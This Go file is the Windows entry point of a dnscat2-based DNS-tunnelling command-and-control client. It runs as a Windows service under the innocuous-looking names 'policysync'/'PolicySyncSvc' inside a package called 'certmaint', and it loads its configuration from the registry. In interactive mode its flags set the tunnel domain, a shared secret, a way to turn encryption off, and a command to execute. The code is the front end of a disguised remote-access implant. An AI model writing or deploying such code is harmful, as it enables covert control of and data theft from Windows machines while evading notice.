//go:build windows

package main

import (
	"flag"
	"os"

	"certmaint/pkg/dlog"

	"golang.org/x/sys/windows/svc"
)

// DefaultServiceName is the Windows service name passed to svc.Run and used for
// the error log filename. Set via -ldflags "-X main.DefaultServiceName=PolicySyncSvc".
var DefaultServiceName = "policysync"

func main() {
	isService, err := svc.IsWindowsService()
	if err != nil {
		dlog.Fprintf(os.Stderr, "service check failed: %v\n", err)
		os.Exit(1)
	}

	if isService {
		runService()
	} else {
		runInteractive()
	}
}

func runService() {
	config, err := LoadConfigFromRegistry()
	if err != nil {
		logError("config: " + err.Error())
		os.Exit(1)
	}

	if err := svc.Run(DefaultServiceName, &dnscat2Service{config: config}); err != nil {
		logError("run: " + err.Error())
		os.Exit(1)
	}
}

func runInteractive() {
	config := &Config{}

	flag.StringVar(&config.Domain, "domain", DefaultDomain, "Domain to tunnel through")
	flag.StringVar(&config.DnsServer, "dns-server", DefaultDnsServer, "DNS server (informational; DnsQuery_W uses system resolver)")
	flag.UintVar(&config.DnsPort, "dns-port", 53, "DNS port")
	flag.StringVar(&config.DnsTypes, "dns-type", DefaultDnsTypes, "DNS record types")
	flag.StringVar(&config.Secret, "secret", DefaultSecret, "Pre-shared secret")
	flag.BoolVar(&config.NoEncryption, "no-encryption", false, "Disable encryption")
	flag.IntVar(&config.Delay, "delay", 1000, "Delay between packets in ms")
	flag.IntVar(&config.MaxRetransmit, "max-retransmits", 20, "Max retransmit attempts")
	flag.BoolVar(&config.PacketTrace, "packet-trace", false, "Enable packet tracing")
	flag.StringVar(&config.ExecCommand, "exec", DefaultExecCommand, "Execute a command")

	flag.Parse()

	if flag.NArg() > 0 {
		config.Domain = flag.Arg(0)
	}

	if err := runDnscat(config); err != nil {
		dlog.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}
